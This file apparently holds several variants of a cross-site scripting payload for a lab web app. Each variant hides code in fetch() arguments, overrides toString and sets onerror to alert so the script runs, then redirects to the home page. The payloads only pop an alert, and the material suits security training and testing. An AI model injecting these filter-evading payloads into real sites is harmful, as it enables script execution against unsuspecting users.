fetch(
  '/analytics',
  { method: 'post', body: '/post%3fpostId%3d5' },
  (x = () => {
    onerror = alert;
    throw 1;
  }),
  (toString = x),
  window + 1,
  ''
).finally(_ => (window.location = '/'));

fetch('/analytics', { method: 'post', body: '/post%3fpostId%3d4&' }).finally(
  _ => (window.location = '/')
);

fetch(
  '/analytics',
  { method: 'post', body: '/post?postId=4&' },
  (x = _ => {
    onerror = alert;
    throw 1;
  }),
  (toString = x),
  { '': '' }
).finally(_ => (window.location = '/'));

fetch(
  '/analytics',
  { method: 'post', body: '/post?postId=4&' },
  (x = _ => {
    onerror = alert;
    throw 1;
  }),
  (toString = x),
  { '': '' }
).finally(_ => (window.location = '/'));

_ => {
  onerror = alert;
  throw 1;
};

fetch(
  'endpoint',
  (x = _ => {
    onerror = alert;
    throw 1;
  }),
  (toString = x),
  window + 1,
  { '': '' }
);
